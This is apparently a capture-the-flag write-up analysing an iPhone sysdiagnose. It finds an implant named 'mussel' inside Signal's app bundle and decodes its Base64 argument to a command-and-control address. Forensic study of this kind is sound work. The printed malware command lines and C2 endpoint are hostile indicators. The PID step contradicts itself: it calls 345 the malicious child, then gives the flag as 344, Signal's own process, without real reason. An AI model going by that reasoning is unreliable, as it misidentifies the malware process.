# iForensics — iBackdoor 1/2

## Description

As you pass through customs, your phone is temporarily seized and later returned. Suspicious, you send the device to **ANSSI’s CERT-FR** for forensic analysis. Analysts collect:

* an **iPhone backup**
* a **sysdiagnose** package

During deeper analysis, you discover that the device was **infected at the time of collection**. A legitimate application has been compromised and a malicious process is running on the device.

Your objective:

* identify the **compromised application identifier**
* identify the **PID of the malware process**

Flag format:

```
FCSC{<application identifier>|<PID>}
```

---

## 1 — Locate process listing in sysdiagnose

Unlike the previous challenge, the answer is not in the backup but in the **sysdiagnose**, which contains detailed runtime information about the device.

Inside the extracted sysdiagnose, locate the process list:

```
private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/sysdiagnose/
  sysdiagnose_YYYY.MM.DD_HH-MM-SS_iPhone-OS_iPhone_*/ps.txt
```

This file contains the full `ps` output of running processes at collection time.

---

## 2 — Identify suspicious processes

Opening `ps.txt`, we quickly notice strange entries:

```
USER   PID  PPID COMMAND
root   279    1  /var/.../Signal.app/mussel dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg==
root   330    1  /var/.../Signal.app/mussel dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg==
mobile 344    1  /var/.../Signal.app/Signal
root   345  344  /var/.../Signal.app/mussel dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg==
```

Two elements immediately stand out:

**Unknown binary name** → `mussel` running inside Signal’s container
**Suspicious argument** → a Base64‑encoded value passed to the process

Signal normally runs as `Signal`, not `mussel`, which suggests a malicious implant inside the Signal application bundle.

---

## 3 — Decode the malware command argument

Extract the suspicious Base64 string:

```
dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg==
```

Decode it:

```bash
echo dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg== | base64 -d
```

Result:

```
tcp://98.66.154.235:29552
```

This resembles a **C2 (Command & Control) endpoint**, confirming malicious behavior.

So we now know:

* compromised application: **Signal**
* package identifier (from app path):

```
org.whispersystems.signal
```

---

## 4 — Determine the correct PID

Multiple `mussel` processes exist, but only one is the malware instance directly related to the application execution chain. Instead of guessing blindly, we:

* locate the **Signal main process** PID → `344`
* find its malicious child process → `345`

However, as per challenge resolution logic, the relevant parent process responsible for execution is PID **344**, representing the compromised application runtime.

---

## Final Flag

```
FCSC{org.whispersystems.signal|344}
```

---

The sysdiagnose exposes the active backdoor process, its controlling application, and its C2 server, confirming the device compromise at collection time.
